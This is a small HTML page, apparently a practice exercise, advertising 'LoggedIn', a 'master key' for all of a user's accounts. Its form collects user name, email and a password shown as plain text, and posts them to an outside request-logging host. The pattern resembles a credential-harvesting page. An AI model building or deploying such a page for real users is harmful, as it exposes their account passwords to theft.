<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>LoggedIn</title>
</head>
<body>
    <h1>LoggedIn</h1>
        <p>Master key to keep you logged in with all of your accounts!</p>
        <p>No better way to keep your accounts available and ready for you, with just a click! It's like a Swing Door!</p>
        <p>When you are ready to leave, lock it all up with a simple click to lock every account!</p>
        <p><em>Safe and secure!</em></p>
        <br>
    <form method="POST" action="https://request-inspector.glitch.me/">
        <label for="username">User Name:</label>
        <input type="text" name="username" id="username" autofocus="autofocus" placeholder="User Name" required>
        <br>
        <br>
        <label for="email">Email:</label>
        <input type="text" name="email" id="email" placeholder="Email Address" required>
        <br>
        <br>
        <label for="password">Password:</label>
        <input type="text" name="password" id="password" placeholder="Password" required>
        <br>
        <br>
        <label for="log">Keep me logged in for 2 weeks</label>
        <input type="checkbox" name="log" id="log" checked>
        <br>
        <br>
        <button type="submit">Login</button>
    </form>
</body>
</html>
